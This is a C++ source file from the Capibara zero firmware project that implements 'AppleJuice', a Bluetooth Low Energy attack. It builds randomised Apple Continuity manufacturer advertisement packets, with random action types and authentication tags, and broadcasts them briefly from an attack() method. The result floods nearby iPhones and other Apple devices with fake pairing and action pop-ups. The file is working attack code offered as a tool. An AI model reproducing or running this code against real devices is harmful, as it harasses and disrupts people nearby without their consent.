/*
 * This file is part of the Capibara zero project(https://capibarazero.github.io/).
 * Copyright (c) 2023 Andrea Canale.
 * Copyright (c) RapierXbox
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "AppleJuice.hpp"

AppleJuice::AppleJuice()
{
  pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
}

AppleJuice::~AppleJuice()
{
  pServer->stopAdvertising();
}

NimBLEAdvertisementData AppleJuice::getOAdvertisementData()
{
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;   // Packet Length
  packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00; // ...
  packet[i++] = 0x0F; // Type
  packet[i++] = 0x05; // Length
  packet[i++] = 0xC1; // Action Flags
  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
  packet[i++] = types[rand() % sizeof(types)]; // Action Type
  esp_fill_random(&packet[i], 3);              // Authentication Tag
  i += 3;
  packet[i++] = 0x00; // ???
  packet[i++] = 0x00; // ???
  packet[i++] = 0x10; // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void AppleJuice::attack()
{
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}